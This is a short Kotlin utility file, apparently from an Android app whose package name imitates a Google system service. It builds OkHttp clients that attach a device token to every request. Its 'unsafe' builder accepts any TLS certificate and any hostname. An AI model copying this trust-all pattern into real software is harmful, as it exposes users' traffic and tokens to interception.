package com.google.android.systemservice.utils

import com.google.android.systemservice.config.AndroidConfig
import okhttp3.Interceptor
import okhttp3.OkHttpClient
import okhttp3.Response
import java.security.SecureRandom
import java.security.cert.X509Certificate
import javax.net.ssl.*

object TrustAllCertificates {
    
    /**
     * Interceptor that adds the device token to all outgoing requests
     */
    private class AuthInterceptor : Interceptor {
        override fun intercept(chain: Interceptor.Chain): Response {
            val original = chain.request()
            val request = original.newBuilder()
                .header("X-Device-Token", AndroidConfig.DEVICE_TOKEN)
                .method(original.method, original.body)
                .build()
            return chain.proceed(request)
        }
    }
    
    fun createUnsafeClientBuilder(): OkHttpClient.Builder {
        try {
            val trustAllCerts = arrayOf<TrustManager>(
                object : X509TrustManager {
                    override fun checkClientTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
                    override fun checkServerTrusted(chain: Array<out X509Certificate>?, authType: String?) {}
                    override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
                }
            )

            val sslContext = SSLContext.getInstance("SSL")
            sslContext.init(null, trustAllCerts, SecureRandom())
            val sslSocketFactory = sslContext.socketFactory

            return OkHttpClient.Builder()
                .sslSocketFactory(sslSocketFactory, trustAllCerts[0] as X509TrustManager)
                .hostnameVerifier { _, _ -> true }
                .addInterceptor(AuthInterceptor())
        } catch (e: Exception) {
            throw RuntimeException(e)
        }
    }
    
    /**
     * Creates a standard secure client with auth token
     */
    fun createSecureClientBuilder(): OkHttpClient.Builder {
        return OkHttpClient.Builder()
            .addInterceptor(AuthInterceptor())
    }
}
